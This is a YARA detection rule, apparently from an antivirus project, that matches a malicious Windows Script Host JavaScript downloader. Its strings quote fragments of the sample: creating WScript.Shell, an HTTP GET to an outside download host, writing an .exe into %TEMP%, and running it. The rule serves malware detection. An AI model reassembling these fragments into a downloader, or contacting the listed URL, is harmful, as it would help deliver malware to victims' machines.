rule sig_20160329_db8db6122e5bd27fc269c458dbf6cad1 {
  meta:
    description = "datamaliciousorder - file 20160329_db8db6122e5bd27fc269c458dbf6cad1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c2158ee96e5f77d655d5b87dd507a5b9e14ffb9d179fe933b5ffd1058f5054e0"

  strings:
    $s1  = "function XT() {return z[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2lbnKfeg8F.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[P](CZ() * 11); if (B[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "B[x](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s4  = "var z = function ao() {return WScript[UP](\"WScript.Shell\");}(), s = 11;" fullword ascii
    $s5  = "function Ng(t, M){Jm = Jm * 1; return t - M;};" fullword ascii
    $s6  = "function H(){return \"\" + jy;};" fullword ascii
    $s7  = "function i() {return ((A1 == true) && (A1 == mB)) ? 1 : Jm;};" fullword ascii
    $s8  = "function mr(l){z[\"Run\"](l, Jm, Jm);};" fullword ascii
    $s9  = " while (A){" fullword ascii
    $s10 = "function hE(bo) {var Yf = (1, 2, 3, 4, 5, bo); return Yf;};" fullword ascii
    $s11 = "var Tr = new this[\"Date\"]();" fullword ascii
    $s12 = "return Ng(o, H1);" fullword ascii
    $s13 = "function ea()" fullword ascii
    $s14 = "function UB(){return UP;};" fullword ascii
    $s15 = "function CZ(){return 22;};" fullword ascii
    $s16 = "var QC = false;" fullword ascii
    $s17 = "var A1 = false;" fullword ascii
    $s18 = "mB = true; " fullword ascii
    $s19 = "var mB = false;" fullword ascii
    $s20 = "A1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}